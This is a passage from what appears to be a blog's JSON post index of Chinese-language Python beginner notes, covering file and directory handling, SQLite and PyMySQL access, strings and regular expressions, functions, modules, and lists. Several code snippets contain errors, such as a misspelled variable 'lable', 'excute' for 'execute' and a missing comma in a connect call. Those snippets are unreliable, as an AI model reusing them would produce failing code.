print(&quot;文件绝对路径:&quot;,os.path.abspath(&quot;test/qwzf.txt&quot;)) print(&quot;拼接路径:&quot;,os.path.join(r&quot;F:\\Python&quot;,r&quot;test\\qwzf.txt&quot;)) #拼接路径不会检查目录是否存在 3.判断目录是否存在os.path.exists(path)判断目录(文件)是否存在，不区分大小写4.创建目录os.mkdir(path,mode=0o777) mode指定数值模式，可省略 import os if not os.path.exists(r&quot;D:\\demo&quot;): os.mkdir(r&quot;D:\\demo&quot;) else: print(&quot;该目录已存在&quot;) 创建多级目录（1）递归调用os.mkdir() import os def mkdir(path): #创建一个递归函数用于创建目录 if not os.path.isdir(path): #判断是否为路径 mkdir(os.path.split(path)[0]) else: return os.mkdir(path) #创建目录 mkdir(r&quot;D:\\demo\\qwzf1\\qwzf2&quot;) （2）os.makedirs(name,mode=0o777)创建多级目录 import os os.makedirs(r&quot;D:\\demo\\qwzf\\qwzf2020&quot;) #创建多级目录 5.删除目录删除空目录：os.rmdir(path)删除非空目录：shutil.rmtree(path) import shutil shutil.rmtree(r&quot;D:\\demo&quot;) #删除非空目录 6.遍历目录 os.walk(top[,topdown][,onerror][,followlinks]) #top 指定要遍历内容的根目录 #topdown 可选,为 True,则优先遍历top目录,否则优先遍历 top 的子目录(默认为开启)。 #onerror 可选，指定错误处理方式 #followlinks 可选,如果为 True，访问软链接指向的目录，默认开启 &#39;&#39;&#39; 返回值：元组生成器对象 (dirpath,dirnames,filenames) dirpath 字符串 当前正在遍历的路径 dirnames 列表 当前路径下包含的子目录 filenames 列表 当前路径下包含的文件 &#39;&#39;&#39; import os path = r&quot;F:\\Python\\test&quot; print(&quot;未整理前的遍历结果:&quot;) for p in os.walk(path): print(p,&quot;\\n&quot;) print(&quot;整理后的遍历结果:&quot;) print(&quot;【&quot;,path,&quot;】目录下包含的文件和目录:&quot;) for root,dirs,files in os.walk(path): #遍历指定目录 for dirname in dirs: print(os.path.join(root,dirname)) #输出遍历到的目录 for filename in files: print(&quot;\\t&quot;,os.path.join(root,filename)) #输出遍历到的目录 3、高级文件操作1.删除文件os.remove(path)2.重命名文件和目录 os.rename(src,dst) #src要进行重命名的目录或文件路径 #dst重命名之后的目录或文件路径 3.获取文件基本信息os.stat(path)os.stat() 方法python获取文件信息 import os def formatTime(longtime): &#39;&#39;&#39;格式化时间的函数&#39;&#39;&#39; import time return time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;,time.localtime(longtime)) def formatByte(number): &#39;&#39;&#39;格式化文件大小的函数&#39;&#39;&#39; for(scale,label) in [(1024*1024*1024,&quot;GB&quot;),(1024*1024,&quot;MB&quot;),(1024,&quot;KB&quot;)]: if number&gt;=scale: return &quot;%.2f %s&quot; %(number*1.0/scale,lable) elif number ==1: return &quot;1字节&quot; else: #小于1字节 byte = &quot;%.2f&quot; % (number or 0) return (byte[:-3] if byte.endswith(&quot;.00&quot;) else byte) + &quot;字节&quot; fileinfo = os.stat(&quot;qwzf.png&quot;) #获取文件的基本信息 print(&quot;文件完整路径：&quot;,os.path.abspath(&quot;qwzf.png&quot;)) #获取文件的完整路径 #输出文件的基本信息 print(&quot;索引号:&quot;,fileinfo.st_ino) print(&quot;设备名:&quot;,fileinfo.st_dev) print(&quot;文件大小:&quot;,formatByte(fileinfo.st_size)) print(&quot;最后一次访问时间:&quot;,formatTime(fileinfo.st_atime)) print(&quot;最后一次修改时间:&quot;,formatTime(fileinfo.st_mtime)) print(&quot;最后一次状态变化的时间:&quot;,formatTime(fileinfo.st_ctime)) 十、操作数据库1、数据库编程接口Python操作数据库的规范：DB_API参考：数据库__DB-API、Python DB-API1.连接对象connect()函数-&gt;Connection对象Connection()的常用参数列表： dsn:数据源名称.给出该参数表示数据库依赖 user: 数据库登陆名.默认是当前用户 password: 数据库登陆的秘密.默认为空 host: 数据库主机名.默认是用本地主机 database(db): 要使用的数据库名.没有默认值 port: MySQL服务使用的TCP端口.默认是3306 charset: 数据库编码. utf-8 Connection对象常用方法： cursor() :使用该连接创建并返回游标(获取游标对象，操作数据库。)commit():提交当前事务rollback():回滚当前事务close():关闭数据库连接 2.游标对象Connection对象-&gt;cursor()-&gt;Cursor对象Cursor对象常用方法： callproc(procname,[,parameters]):调用存储过程，需要数据库支持close():关闭当前游标对象excute(sql[, args]):执行一个数据库查询或命令excutemany(sql, args):执行多个数据库查询或命令fetchone():获取查询结果集的下一条记录fetchmany([size = cursor.arraysize]):获取指定数量的记录fetchall():获取结果集的所有记录nextset():跳至下一个可用结果集 #获取Connection对象 conn = pymysql.connect(host=&#39;localhost&#39;, user=&#39;user&#39;, password=&#39;passwd&#39;, db=&#39;test&#39;, charset=&#39;utf-8&#39; cursorclass=pymysql.cursors.DictCursor) #生成Cursor对象 cur = conn.cursor() #执行SQL语句 cur.excute(&quot;insert into users(id,name) values(1,&#39;qwzf&#39;)&quot;) #关闭Cursor对象 cur.close() #提交当前事务 conn.commit() #关闭Connection对象 conn.close() 2、使用SQLitePython内置SQLite模块：sqlite3连接数据库-&gt;执行SQL语句-&gt;关闭连接1.创建数据库文件实现步骤：导入sqlite3模块-&gt;创建Connection对象-&gt;创建Cursor对象-&gt;执行SQL语句-&gt;关闭游标-&gt;关闭连接 #导入模块 import sqlite3 #创建连接对象 conn = sqlite3.connect(&#39;qwzf.db&#39;) #创建游标对象 cursor = conn.cursor() #执行SQL语句 cursor.execute(&#39;create table user(id int(10) primary key,name varchar(20))&#39;) #关闭游标 cursor.close() #关闭连接 conn.close() 2.操作SQLite数据库即增删改查，参考：python 操作SQLite3数据库的方法 3、使用PyMySQL PyMySQL 是在 Python3.x 版本中用于连接 MySQL 服务器的一个库1.下载安装MySQL可以直接使用内置MySQL的集成软件，如：phpstudy2.安装PyMySQL pip install PyMySQL 测试是否安装成功 &gt;&gt;&gt; import pymysql 3.连接数据库 #导入PyMySQL模块 import pymysql #调用connect()函数产生Connection连接对象 db = pymysql.connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;,&#39;testpy&#39;,&#39;utf8&#39;) #db = pymysql.connect(host = &#39;localhost&#39;,user = &#39;root&#39;,password = &#39;root&#39;,database = &#39;testpy&#39;,charset = &#39;utf8&#39;) #调用cursor()方法，创建Cursor对象 cursor = db.cursor() #执行SQL语句 cursor.execute(&#39;select version()&#39;) data = cursor.fetchone() print(data) #关闭游标和连接 cursor.close() db.close() 4.操作MySQL数据库即增删改查，参考：使用pymysql操作数据库、pymysql数据库之建库建表、增删改查 后记到现在为止Python基础知识已经基本学完了(这里表示还没学Python的面向对象程序设计和GUI界面编程)。在这些Python的基础知识上，可以开始愉快的开启Python进阶之旅了@_@！！！","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://qwzf.github.io/categories/编程开发/"},{"name":"Python","slug":"编程开发/Python","permalink":"https://qwzf.github.io/categories/编程开发/Python/"}],"tags":[{"name":"异常处理及程序调试","slug":"异常处理及程序调试","permalink":"https://qwzf.github.io/tags/异常处理及程序调试/"},{"name":"文件及目录操作","slug":"文件及目录操作","permalink":"https://qwzf.github.io/tags/文件及目录操作/"},{"name":"操作数据库","slug":"操作数据库","permalink":"https://qwzf.github.io/tags/操作数据库/"}],"author":"qwzf"},{"title":"Python学习-基础篇(三)","slug":"Python学习-基础篇(三)","date":"2020-01-19T10:16:50.249Z","updated":"2020-12-23T14:07:18.818Z","comments":true,"path":"2020/01/19/Python学习-基础篇(三)/","link":"","permalink":"https://qwzf.github.io/2020/01/19/Python学习-基础篇(三)/","excerpt":"","text":"前言由于我现在暂时用不到面向对象程序设计，所以暂且先不学习Python的面向对象程序设计。本篇包含：字符串及正则表达式、函数、模块 五、字符串及正则表达式1、字符串1.字符串常用操作（1）拼接字符串 字符串1+字符串2 = 字符串1 字符串2 字符串不可以直接和数值类型相加（2）计算字符串的长度字符串的长度，即字符串所占字节数。A-Z、a-z、0-9、._空格等占一个字节中文汉字占2~4字节：UTF-8占3个；GBK(gb2312)占2个1）计算字符串字符的个数 len(string) #len()函数获取字符的个数，不管中文还是英文都按一个字符计算 2）计算字符串所占字节数 len(string.encode()) #计算UTF-8编码字符长度 len(string.encode(&quot;gbk&quot;)) #计算GBK编码字符长度 （3）截取字符串字符串属于序列。所以：1）获取字符可以使用索引 string[索引值] 2）截取字符串可以使用切片 string[start:end:step] （4）分割、合并字符串1）分割字符串：split() listname = str.split(sep,maxsplit) #sep指定分隔符，默认值是空白符，如：空格、\\n、\\t。 #maxsplit分隔次数，-1表示没有限制 &gt;&gt;&gt; str1 = &quot;你 有 多 自信,\\n世界 就有 多 相信你&quot; &gt;&gt;&gt; str1.split() [&#39;你&#39;, &#39;有&#39;, &#39;多&#39;, &#39;自信,&#39;, &#39;世界&#39;, &#39;就有&#39;, &#39;多&#39;, &#39;相信你&#39;] &gt;&gt;&gt; str1.split(&quot; &quot;) [&#39;你&#39;, &#39;&#39;, &#39;有&#39;, &#39;多&#39;, &#39;自信,\\n世界&#39;, &#39;就有&#39;, &#39;多&#39;, &#39;相信你&#39;] &gt;&gt;&gt; str1.split(&quot; &quot;,5) [&#39;你&#39;, &#39;&#39;, &#39;有&#39;, &#39;多&#39;, &#39;自信,\\n世界&#39;, &#39;就有 多 相信你&#39;] &gt;&gt;&gt; str1.split(&quot;\\n&quot;) [&#39;你 有 多 自信,&#39;, &#39;世界 就有 多 相信你&#39;] str1 = &quot;@lemon @qwzf @未完成的歌 @chumen007&quot; list1 = str1.split(&#39; &#39;) #用空格分隔字符串 for item in list1: print(item[1:]) #输出好友，并去掉@ 2）合并字符串：join() strnew = string.join(iterable) #string合并时的分隔符 #iterable可迭代对象 list1 = [&quot;lemon&quot;,&quot;qwzf&quot;,&quot;未完成的歌&quot;,&quot;chumen007&quot;] #好友列表 str1 = &quot; @&quot;.join(list1) #用空格和@连接 str2 = &quot;@&quot; + str1 print(&quot;你要@的好友:&quot;,str2) （5）检索字符串检索一个字符串在另一个字符串出现的次数：count()检索是否包含子字符串：find()、index()、in关键字检索是否以指定字符串开头和结尾：startswith()、endswith() str.count(sub[,start[,end]]) #sub指定要检索的子字符串 #start指定检索的起始位置 #end指定检索的结束位置 str.find(sub[,start[,end]]) #找到返回首次检索到子字符串的索引值；没找到返回-1 #find从左往右找，rfind从右往左找 str.index(sub[,start[,end]]) #找到返回首次检索到子字符串的索引值；没找到返回异常 #index从左往右找，rindex从右往左找 str.startswith(prefix[,start[,end]]) str.endswith(prefix[,start[,end]]) #prefix指定要检索的字符串 #是，返回True；否，返回False （6）字母的大小写转换1）大写转小写：str.lower()2）小写转大写：str.upper()（7）去除字符串中的空格和特殊字符特殊字符：\\t、\\r、\\n去除字符串左右两端的空格和特殊字符：str.strip([chars])去除字符串左侧和右侧的空格和特殊字符：str.lstrip([chars])、str.rstrip([chars])（8）格式化字符串1）使用%操作符 &#39;%[-][+][0][m][.n]格式化字符&#39;%exp #[-]表示左对齐，正数前没有符号；负数的前加上负号 #[+]表示右对齐，正数前加上正号；负数的前加上负号 #[0]表示右对齐，正数前没有符号；负数的前有负号，填充空白处，一般和[m]一起使用 #[m]数值所占宽度 #[0][m]不够宽度前补0 #[.n]小数点后保留n位数 #格式化字符 格式化成字符串s 格式化成十进制整数d 格式化成浮点数f #exp要转换的项 &gt;&gt;&gt; template = &#39;编号:%09d\\t 公司名称:%s\\t 官网:http://www.%s.com&#39; #定义模板 &gt;&gt;&gt; item = (6,&quot;百度&quot;,&quot;baidu&quot;) #要转换内容 &gt;&gt;&gt; print(template%item) 编号:000000006 公司名称:百度 官网:http://www.baidu.com 2）使用字符串对象的format()方法(推荐) str.format(args) #str模板 #{[index][:[[fill]align][sign][#][width][.precision][type]} #index设置索引位置 #fill指定空白处填充字符 #align对齐方式:&lt;内容左对齐；&gt;右对齐；=内容左对齐,符号放填充内容的最右侧；^内容居中 #sign指定有无符号数 ##指定2、8、16进制是否加前缀 #width指定所占宽度 #.precision指定保留小数位数 #type要格式化字符的类型：s、d、f #args要转换的项 &gt;&gt;&gt; template = &#39;编号:{:0&gt;9d}\\t 公司名称:{:s}\\t 官网:http://www.{:s}.com&#39; #定义模板 &gt;&gt;&gt; print(template.format(7,&quot;百度&quot;,&quot;baidu&quot;)) 编号:000000007 公司名称:百度 官网:http://www.baidu.com （9）String模块中的常量：string.digits：数字0~9string.ascii_letters：所有字母（大小写）string.lowercase：所有小写字母string.printable：可打印字符的字符串string.punctuation：所有标点string.uppercase：所有大写字母 2.字符串编码转换ASCII、GBK/GB2312、UTF-8str：Unicode字符 如：”拼搏到感动自己”bytes：二进制数据 如：b’\\xd2\\xb0’和b’mr’（1）使用encode()方法编码将字符串转换成二进制数据，即str-&gt;bytes str.encode([encoding=&quot;utf-8&quot;][,errors=&quot;strict&quot;]) #strict遇到非法参数抛出异常 #ignore忽略非法字符 #replace用?替换非法字符 #xmlcharrefreplace使用xml的字符引用 （2）使用decode()方法解码bytes-&gt;str str.decode([encoding=&quot;utf-8&quot;][,errors=&quot;strict&quot;]) str1 = &quot;拼搏到感动自己&quot; byte1 = str1.encode(&quot;GBK&quot;) byte2 = str1.encode(&quot;utf-8&quot;) str01 = byte1.decode(&quot;GBK&quot;) str02 = byte2.decode(&quot;utf-8&quot;) print(&quot;原字符串：&quot;,str1) print(&quot;GBK编码：&quot;,byte1) print(&quot;UTF-8编码：&quot;,byte2) print(&quot;GBK解码：&quot;,str01) print(&quot;UTF-8解码：&quot;,str02) 2、正则表达式1.正则表达式（1）行定位符^表示开始$表示结束（2）元字符常用的除^、$外，还有：（3）限定符（4）字符类[]如：匹配元音字母[aeiou]、匹配汉字[\\u4e00-\\u9fa5]（5）排除字符^^放到[]中表示排除，如[^a-zA-Z]（6）选择字符|如：[a-z]|[0-9]匹配a-z或0-9（7）转义字符\\（8）分组()如：(\\.[0-9]{1,3}){3}对分组匹配3次补充：原生字符串，如：&#39;\\\\bm\\\\w*\\\\b&#39;写成原生字符串r&#39;\\bm\\w*\\b&#39; 2.使用re模块实现正则表达式操作（1）匹配字符串1）re.match 只是从头开始匹配 re.match(pattern,string,[flags]) #pattern模式字符串 #string要进行匹配的字符串 #flags指定标志位 #标志位控制匹配方式：re.I:不区分字母大小写，re.A:让\\w不匹配汉字 import re pattern = r&#39;qw_\\w*&#39; #模式字符串 string = &#39;QW_PYTHON qw_python&#39; #要匹配的字符串 match = re.match(pattern,string,re.I) #匹配字符串 print(match) print(&quot;起始位置：&quot;,match.start()) print(&quot;结束位置：&quot;,match.end()) print(&quot;匹配数据：&quot;,match.group()) 2）re.search 匹配包含 re.search(pattern,string,[flags]) import re pattern = r&#39;qw_\\w*&#39; #模式字符串 string = &#39;项目QW_PYTHON qw_python&#39; #要匹配的字符串 match = re.search(pattern,string,re.I) #匹配字符串 print(match) print(&quot;起始位置：&quot;,match.start()) print(&quot;结束位置：&quot;,match.end()) print(&quot;匹配数据：&quot;,match.group()) 3）re.findall 把所有匹配到的字符放到以列表中的元素返回 re.findall(pattern,string,[flags]) import re pattern = r&#39;qw_\\w*&#39; #模式字符串 string = &#39;项目QW_PYTHON qw_python&#39; #要匹配的字符串 match = re.findall(pattern,string,re.I) #匹配字符串 print(&quot;匹配到字符串列表：&quot;,match) print(&quot;匹配到的字符串：&quot;) for item in match: print(item) （2）替换字符串re.sub 匹配字符并替换 re.sub(pattern,repl,string,count,flags) #repl用来进行替换的字符串 #count替换的最大次数，默认值0替换所有 import re pattern = r&#39;1[3-8]\\d{9}&#39; #模式字符串 string = &#39;中奖号码：888999 联系电话：13866666611&#39; #要匹配的字符串 result = re.sub(pattern,&quot;1xxxxxxxxxx&quot;,string) #替换字符串 print(result) （3）分割字符串re.split 以匹配到的字符当做列表分隔符 re.split(pattern,string,[maxsplit],[flags]) #maxsplit最大拆分次数 import re pattern = r&#39;[?|&amp;]&#39; #分隔符 string = &quot;http://www.xxx.com/login.php?user=&#39;qwzf&#39;&amp;pwd=&#39;qwzf&#39;&quot; #要匹配的字符串 result = re.split(pattern,string) #分割字符串 print(result) 补充：re.fullmatch 全部匹配 六、函数1、函数的创建和调用#创建函数 def functionname([参数]): &#39;&#39;&#39;函数说明&#39;&#39;&#39; 函数体 #调用函数 functionname([参数]) 2、参数传递1.了解形式参数和实际参数值传递和引用传递值传递-&gt;不可变对象-&gt;不改变形式参数的值引用传递-&gt;可变对象-&gt;改变形式参数的值2.位置参数位置参数是必须按照定义时的个数和顺序进行参数传递，也称必备参数。3.关键字参数关键字参数是指使用形式参数的名字来确定输入的参数值。 def functionname(p1,p2,p3): 函数体 functionname(p1=v1,p2=v2,p3=v3) functionname(p1=v1,p3=v3,p2=v2) 4.为参数设置默认值 def functionname(...,[参数名=默认值]): 函数体 #默认值参数必须放在所有参数的最后 如： def functionname(p2,p3,p1=v1): 函数体 #查看默认值 print(functionname,__defaults__) 为参数设置默认值时，参数必须指向不可变对象。遇到可变对象，参数默认值可以设置为None。5.可变参数个数不固定的参数-&gt;0、1、2…n个参数（1）*parameter接收任意多个实参，并把它们放到元组中也可接收列表 def coffee(*name): print(&quot;\\n咖啡有：&quot;) for item in name: print(item) #输出咖啡名称 coffee(&quot;卡布奇诺&quot;,&quot;蓝山&quot;,&quot;拿铁&quot;) list1 = [&quot;卡布奇诺&quot;,&quot;蓝山&quot;,&quot;拿铁&quot;] coffee(*list1) （2）**parameter接收任意多个类似关键字参数一样显式赋值的实参，并将其放到一个字典中也可接收字典 def sign(**sign): print() for key,value in sign.items(): #遍历字典 print(key,&quot;的汉字是&quot;,value) sign(chi=&#39;吃&#39;,kan=&#39;看&#39;) dict1 = {&#39;zi&#39;:&#39;字&#39;,&#39;dian&#39;:&#39;典&#39;} sign(**dict1) 3、返回值return [value] #不指定return或没有value，返回None def functionname(p1,p2,p3): 函数体 return r1,r2...... result = functionname(v1,v2,v3) #只有一个返回值result保存的是返回值 #有多个返回值result保存的是元组 4、变量的作用域变量的作用域是指程序代码能够访问该变量的区域，如果超出该区域，再访问时就会出现错误。根据变量有效范围：局部变量和全局变量函数体内修改全局变量：在函数体内定义一个全局变量，使用global关键字将局部变量变成全局变量 string = &quot;我学Python&quot; def demo(): global string #定义全局变量 string = &quot;我被修改了！&quot; #修改全局变量 print(&quot;函数内全局变量&quot;,string) demo() print(&quot;函数外全局变量&quot;,string) 5、匿名函数(lambda)Python中使用lambda表达式来实现匿名函数。 result = lambda [arg1[,arg2,...,argn]]:expression #arg1参数 #expression实现具体功能的表达式，不能出现for或while等 import math r = 10 #半径 result = lambda r:math.pi*r*r print(&quot;半径为&quot;,r,&quot;的圆面积为:&quot;,result(r)) 七、模块1、模块概述模块是Python程序模块-&gt;*.py把能够实现某一特定功能的代码放置在一个文件中作为一个模块，从而方便其他程序和脚本导入并使用。使用模块的四点好处：（1）可以避免函数名和变量名冲突（2）更容易查找代码（3）提高代码的可重用性（4）有选择的使用 2、自定义模块模块可包含：函数、变量、类、可执行代码1.创建模块模块名.py-&gt;文件名模块名不能是Python自带的标准模块名称。 #calculate.py def add(a,b): #加法 return round(a+b,1) #demo.py import calculate #导入模块 x = 0.2 y = 0.3 print(calculate.add(x,y)) 2.使用import语句导入模块 import modulename [as alias] #alias别名 #使用as关键字为模块指定别名 #指定别名之后，可以通过别名引用模块 import语句导入模块-&gt;命名空间3.使用from…import语句导入模块 from modulename import member #member变量、函数、类 #导入模块全部定义，使用* #dir()函数打印模块的全部定义 #calculate.py def add(a,b): #加法 return round(a+b,1) def sub(a,b): #减法 return round(a-b,1) def mul(a,b): #乘法 return round(a*b,1) #demo.py from calculate import add #导入模块中add()函数 x = 0.2 y = 0.3 print(add(x,y)) 注：导入两个包括同名函数的模块，使用import语句导入。4.模块搜索目录导入模块时查找模块的顺序是：1）先从内存中，已经存在的模块中查找2）内置的模块3）自定义模块4）环境变量sys.path中找（1）临时添加临时目录只在当前执行的窗口有效 #F:\\Python\\temp\\calculate.py def add(a,b): #加法 return round(a+b,1) #F:\\Python\\demo\\demo.py import sys #导入内置模块 sys.path.append(&#39;F:/Python/temp&#39;) #添加临时目录 import calculate #导入自定义模块 print(sys.path) x = 0.2 y = 0.3 print(calculate.add(x,y)) （2）增加.pth文件(推荐)只在当前Python版本有效 #F:\\Python\\demo\\demo.py import sys #导入内置模块 import calculate #导入自定义模块 print(sys.path) x = 0.2 y = 0.3 print(calculate.add(x,y)) （3）在PYTHONPATH环境变量中添加在多个Python版本有效 3、以主程序的形式执行由于Python没有统一的程序入口，从第一行开始执行。会出现一些问题。解决方法：以主程序的形式执行 if __name__ == &#39;__main__&#39; #__name__记录模块名称的变量。 #当程序在顶级模块运行时，返回的值就是__main__；被导入其他文件时，返回的值是模块名称 #calculate.py str1 = &quot;我学Python&quot; def string(): str2 = &quot;没有什么不可能&quot; return str2 print(&quot;__name__运行测试：&quot;,__name__) if __name__ == &#39;__main__&#39;: print(&quot;以主程序的形式执行&quot;) print(str1) #main.py import calculate #导入模块 print(&quot;导入模块后输出:&quot;,calculate.str1) 4、Python中的包包-&gt;文件夹-&gt;__init__.py规范代码模块：避免函数名和变量名重名引发的冲突包：避免模块名重名引发的冲突1.Python程序的包结构文件夹下包含__init__.py，则这个文件夹就是个包2.创建和使用包（1）创建包1）创建文件夹2）在文件夹下，创建__init__.py3）在文件夹下，创建模块（2）使用包1）import + 完整包名 + 模块名如： import settings.size print(settings.size.width) 2）from + 完整包名 + import + 模块名如： from settings import size print(size.width) 3）from + 完整包名 + .模块名 + import + 定义名如： from settings.size import width print(width) 5、引用其他模块1.标准模块标准模块可查看官方说明文档：python37/Doc/python373.chm：The Python Standard Library中文版参考：Python3.x标准模块库目录2.第三方模块的下载与安装（1）下载网站： https://pypi.org/ http://pypi.python.org/pypi （2）pip pip &lt;command&gt; [modulename] #command包括：install、uninstall、list #install安装第三方模块 #uninstall卸载第三方模块 #list显示已经安装的第三方模块 导入模块顺序：标准模块-&gt;第三方模块-&gt;自定义模块常用pip命令：1）不同Python版本使用pip： python3 -m pip &lt;command&gt; [modulename] 2）pip源临时更换到国内镜像： pip install -i https://pypi.tuna.tsinghua.edu.cn/simple [modulename] 将pip源更换到国内镜像（3）通过setup.py安装 打开cmd 到达安装目录 python setup.py build python setup.py install 后记学习完字符串及正则表达式、函数、模块后，掌握了字符串的操作、正则表达式模式串的编写、函数相关知识和模块的使用。继续学习@_@","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://qwzf.github.io/categories/编程开发/"},{"name":"Python","slug":"编程开发/Python","permalink":"https://qwzf.github.io/categories/编程开发/Python/"}],"tags":[{"name":"字符串及正则表达式","slug":"字符串及正则表达式","permalink":"https://qwzf.github.io/tags/字符串及正则表达式/"},{"name":"函数","slug":"函数","permalink":"https://qwzf.github.io/tags/函数/"},{"name":"模块","slug":"模块","permalink":"https://qwzf.github.io/tags/模块/"}],"author":"qwzf"},{"title":"Python学习-基础篇(二)","slug":"Python学习-基础篇(二)","date":"2020-01-18T12:01:31.049Z","updated":"2020-08-01T15:48:58.942Z","comments":true,"path":"2020/01/18/Python学习-基础篇(二)/","link":"","permalink":"https://qwzf.github.io/2020/01/18/Python学习-基础篇(二)/","excerpt":"","text":"前言本篇包含：序列的应用(列表、元组、字典、集合) 四、序列的应用序列序列是一块用于存放多个值的连续内存空间，并且按一定顺序排列，可以通过索引取值。1.索引索引-&gt;编号-&gt;下标从0开始计数索引可以是负数(从-1开始) 元素1 元素2 元素3 元素4 0 1 2 3 -4 -3 -2 -1 &gt;&gt;&gt; string = &quot;一言既出，驷马难追。&quot; &gt;&gt;&gt; print(string[1]) 言 &gt;&gt;&gt; print(string[-2]) 追 2.切片(分片) sname[start : end : step] #sname：列表名称 #start：起始值(包括) #end：结束值(不包括) #step：步长 &gt;&gt;&gt; student = [&quot;小明&quot;,&quot;赵四&quot;,&quot;小赵&quot;,&quot;李明&quot;,&quot;张张&quot;,&quot;李华&quot;,&quot;王强&quot;] &gt;&gt;&gt; print(student[1:5]) [&#39;赵四&#39;, &#39;小赵&#39;, &#39;李明&#39;, &#39;张张&#39;] &gt;&gt;&gt; print(student[0:5:2]) [&#39;小明&#39;, &#39;小赵&#39;, &#39;张张&#39;] &gt;&gt;&gt; print(student[5]) #只有end并省略:就变成了索引 李华 &gt;&gt;&gt; print(student[:5]) [&#39;小明&#39;, &#39;赵四&#39;, &#39;小赵&#39;, &#39;李明&#39;, &#39;张张&#39;] &gt;&gt;&gt; print(student[:]) [&#39;小明&#39;, &#39;赵四&#39;, &#39;小赵&#39;, &#39;李明&#39;, &#39;张张&#39;, &#39;李华&#39;, &#39;王强&#39;] &gt;&gt;&gt; print(student[5:]) [&#39;李华&#39;, &#39;王强&#39;] 3.序列相加序列1+序列2=序列1 序列2只能是同类型的序列相加，如：列表+列表、元组+元组、字符串+字符串 &gt;&gt;&gt; stu1 = [&quot;小明&quot;,&quot;赵四&quot;,&quot;小赵&quot;,&quot;李明&quot;] &gt;&gt;&gt; stu2 = [&quot;张张&quot;,&quot;李华&quot;,&quot;王强&quot;] &gt;&gt;&gt; stu = stu1+stu2 &gt;&gt;&gt; print(stu) [&#39;小明&#39;, &#39;赵四&#39;, &#39;小赵&#39;, &#39;李明&#39;, &#39;张张&#39;, &#39;李华&#39;, &#39;王强&#39;] 4.乘法序列*乘数=重复n次的序列 &gt;&gt;&gt; number = [1,2,3] &gt;&gt;&gt; print(number*3) [1, 2, 3, 1, 2, 3, 1, 2, 3] &gt;&gt;&gt; emptylist = [None]*5 #初始化列表长度 &gt;&gt;&gt; print(emptylist) [None, None, None, None, None] 5.检查某个元素是否是序列的成员 value in sequence #value：要检查的元素 #sequence：序列 &gt;&gt;&gt; content = [1,2,3,4,&quot;小明&quot;,&quot;李华&quot;] &gt;&gt;&gt; print(2 in content) True &gt;&gt;&gt; print(&quot;小明&quot; in content) True &gt;&gt;&gt; print(6 in content) False &gt;&gt;&gt; print(&quot;小王&quot; not in content) True 6.计算序列的长度、最大值和最小值计算序列的长度：len()计算序列的最大值：max()计算序列的最小值：min()将序列转换为列表：list()将序列转换为字符串：str()计算列表之中元素和：sum对元素进行排序：sorted()反转序列元素：reversed()把序列组合为索引序列：enumerate() &gt;&gt;&gt; number = [25,6,32,88,22] &gt;&gt;&gt; print(len(number)) 5 &gt;&gt;&gt; print(max(number)) 88 &gt;&gt;&gt; print(min(number)) 6 &gt;&gt;&gt; string = &quot;我学Python&quot; &gt;&gt;&gt; print(len(string)) 8 1、列表(list)[元素1,元素2,...,元素n] 列表是可变序列，列表可以放入：整数、实数、布尔值、字符串、序列、对象1.列表的创建和删除创建列表（1）使用赋值运算符直接创建列表 listname = [元素1,元素2,...,元素n] （2）创建空列表 listname = [] （3）创建数值列表 listname = [数值1,数值2,...,数值n] #跳一跳 &gt;&gt;&gt; list(range(2,21,2)) [2, 4, 6, 8, 10, 12, 14, 16, 18, 20] 删除列表 del listname Python自带垃圾回收机制会自动销毁不用的列表，所以即使我们不手动将其删除，Python也会自动将其回收。2.访问列表元素访问列表元素，即获取列表的内容。有三种方法：（1）直接使用print()函数输出（2）索引（3）切片3.遍历列表（1）直接使用for循环 for item in listname: #输出item （2）使用for循环和enumerate()函数enumerate()函数获取索引值，也就是下标 for index,item in enumerate(listname): #输出index和item print(&quot;成绩排名：&quot;) student = [&quot;小明&quot;,&quot;赵四&quot;,&quot;小赵&quot;,&quot;李明&quot;,&quot;张张&quot;,&quot;李华&quot;,&quot;王强&quot;] for index,item in enumerate(student): print(index+1,item) 4.添加、修改和删除列表元素添加元素（1）追加元素：append()、insert() 列表1.append(新元素)=列表1中的元素,新元素 列表对象提供了insert()方法向列表的指定位置插入元素 列表1.insert(索引值,新元素) insert()方法没有append()方法执行效率高 student = [&quot;小明&quot;,&quot;赵四&quot;,&quot;小赵&quot;,&quot;李明&quot;] student.append(&quot;我是append添加的&quot;) print(student) student.insert(1,&quot;我是insert添加的&quot;) print(student) （2）添加列表：extend()一个列表的全部元素添加到另一个列表中 listname.extend(seq) oldlist = [&quot;小明&quot;,&quot;赵四&quot;,&quot;小赵&quot;,&quot;李明&quot;] newlist = [&quot;张飞&quot;,&quot;李华&quot;] oldlist.extend(newlist) print(oldlist) 修改元素 list = [&quot;长亭外&quot;,&quot;古道边&quot;,&quot;一行白鹭上青天&quot;] list[2] = &quot;芳草碧莲天&quot; print(list) 删除元素（1）根据索引删除：del list = [&quot;长亭外&quot;,&quot;古道边&quot;,&quot;一行白鹭上青天&quot;] print(&quot;删除前：&quot;,list) del list[2] print(&quot;删除后：&quot;,list) （2）根据元素值删除：remove() list = [&quot;长亭外&quot;,&quot;古道边&quot;,&quot;一行白鹭上青天&quot;] print(&quot;删除前：&quot;,list) list.remove(&quot;一行白鹭上青天&quot;) print(&quot;删除后：&quot;,list) 5.对列表进行统计计算获取指定元素出现的次数：count()获取指定元素首次出现的索引值(下标)：index()统计数值列表各元素的和：sum() listname.count(obj) listname.index(obj) sum(iterable[,start]) #将统计结果加上start所指定的数，没有默认0 &gt;&gt;&gt; grade = [89,86,69,59,92] &gt;&gt;&gt; print(sum(grade)) 395 &gt;&gt;&gt; print(sum(grade,5)) 400 6.对列表进行排序（1）使用列表对象的sort()方法使用sort()方法实现排序后，原列表中的元素顺序改变 listname.sort(key=None,reverse=False) #key=str.lower排序不区分大小写 #reverse=False按升序排序 grade = [89,86,69,59,92,85] print(&quot;原列表&quot;,grade) grade.sort() #进行升序排序 print(&quot;升序：&quot;,grade) animal = [&quot;cat&quot;,&quot;Dog&quot;,&quot;panda&quot;,&quot;Tiger&quot;] print(&quot;原动物列表&quot;,animal) animal.sort() print(&quot;升序：&quot;,animal) （2）使用内置的sorted()函数使用sorted()函数实现排序后原列表的元素顺序不变 sorted(iterable,key=None,reverse=False) 7.列表推导式列表推导式可以快速生成一个列表，或者根据某个列表生成满足指定需求的列表。 list = [Expression for var in range] 